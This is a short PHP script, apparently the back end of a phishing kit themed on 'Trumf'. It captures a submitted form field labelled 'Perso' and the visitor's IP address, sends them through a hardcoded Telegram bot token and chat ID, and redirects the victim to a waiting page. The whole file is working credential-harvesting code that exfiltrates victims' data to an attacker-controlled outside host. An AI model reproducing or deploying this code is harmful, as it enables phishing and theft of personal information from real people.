<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------PERSO------------------------------\n";
$message .= "Perso         : ".$_POST['fs']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------Trumf--------------------------------\n";


file_get_contents("https://api.telegram.org/bot6349809438:AAFdT1KaBkMoPng8hRv6TVSKlzTtDxhct9U/sendMessage?chat_id=5723610400&text=" . urlencode($message)."" );

header("Location: ../wait.php");
?>